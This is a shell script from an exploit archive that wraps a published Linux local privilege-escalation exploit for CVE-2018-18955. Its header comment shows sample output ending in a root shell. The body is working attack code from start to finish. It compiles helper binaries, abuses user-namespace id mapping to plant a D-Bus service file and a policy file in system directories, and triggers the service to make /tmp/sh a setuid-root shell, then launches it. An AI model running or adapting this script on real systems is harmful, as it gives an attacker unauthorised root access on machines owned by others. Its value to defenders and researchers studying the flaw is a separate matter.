#!/bin/sh
#
# EDB Note: Download ~ https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47165.zip
#
# wrapper for Jann Horn's exploit for CVE-2018-18955
# uses dbus service technique
# ---
# test@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955$ ./exploit.dbus.sh
# [*] Compiling...
# [*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
# [.] starting
# [.] setting up namespace
# [~] done, namespace sandbox set up
# [.] mapping subordinate ids
# [.] subuid: 165536
# [.] subgid: 165536
# [~] done, mapped subordinate ids
# [.] executing subshell
# [*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
# [.] starting
# [.] setting up namespace
# [~] done, namespace sandbox set up
# [.] mapping subordinate ids
# [.] subuid: 165536
# [.] subgid: 165536
# [~] done, mapped subordinate ids
# [.] executing subshell
# [*] Launching dbus service...
# Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
# [+] Success:
# -rwsrwxr-x 1 root root 8384 Jan  4 18:31 /tmp/sh
# [*] Cleaning up...
# [*] Launching root shell: /tmp/sh
# root@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955# id
# uid=0(root) gid=0(root) groups=0(root),1001(test)

rootshell="/tmp/sh"
service="org.subuid.Service"

command_exists() {
  command -v "${1}" >/dev/null 2>/dev/null
}

if ! command_exists gcc; then
  echo '[-] gcc is not installed'
  exit 1
fi

if ! command_exists /usr/bin/dbus-send; then
  echo '[-] dbus-send is not installed'
  exit 1
fi

if ! command_exists /usr/bin/newuidmap; then
  echo '[-] newuidmap is not installed'
  exit 1
fi

if ! command_exists /usr/bin/newgidmap; then
  echo '[-] newgidmap is not installed'
  exit 1
fi

if ! test -w .; then
  echo '[-] working directory is not writable'
  exit 1
fi

echo "[*] Compiling..."

if ! gcc subuid_shell.c -o subuid_shell; then
  echo 'Compiling subuid_shell.c failed'
  exit 1
fi

if ! gcc subshell.c -o subshell; then
  echo 'Compiling gcc_subshell.c failed'
  exit 1
fi

if ! gcc rootshell.c -o "${rootshell}"; then
  echo 'Compiling rootshell.c failed'
  exit 1
fi

echo "[*] Creating /usr/share/dbus-1/system-services/${service}.service..."

cat << EOF > "${service}.service"
[D-BUS Service]
Name=${service}
Exec=/bin/sh -c "/bin/chown root:root ${rootshell};/bin/chmod u+s ${rootshell}"
User=root
EOF

echo "cp ${service}.service /usr/share/dbus-1/system-services/${service}.service" | ./subuid_shell ./subshell

if ! test -r "/usr/share/dbus-1/system-services/${service}.service"; then
  echo '[-] Failed'
  /bin/rm "${rootshell}"
  exit 1
fi

echo "[*] Creating /etc/dbus-1/system.d/${service}.conf..."

cat << EOF > "${service}.conf"
<!DOCTYPE busconfig PUBLIC
  "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
  "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>
  <policy context="default">
    <allow send_destination="${service}"/>
  </policy>
</busconfig>
EOF

echo "cp ${service}.conf /etc/dbus-1/system.d/${service}.conf" | ./subuid_shell ./subshell

if ! test -r "/etc/dbus-1/system.d/${service}.conf"; then
  echo '[-] Failed'
  /bin/rm "${rootshell}"
  exit 1
fi

echo "[*] Launching dbus service..."

/usr/bin/dbus-send --system --print-reply --dest="${service}" --type=method_call --reply-timeout=1 / "${service}"

sleep 1

if ! test -u "${rootshell}"; then
  echo '[-] Failed'
  /bin/rm "${rootshell}"
  exit 1
fi

echo '[+] Success:'
/bin/ls -la "${rootshell}"

echo '[*] Cleaning up...'
/bin/rm subuid_shell
/bin/rm subshell
/bin/rm "${service}.conf"
/bin/rm "${service}.service"
echo "/bin/rm /usr/share/dbus-1/system-services/${service}.service" | $rootshell
echo "/bin/rm /etc/dbus-1/system.d/${service}.conf" | $rootshell

echo "[*] Launching root shell: ${rootshell}"
$rootshell
            
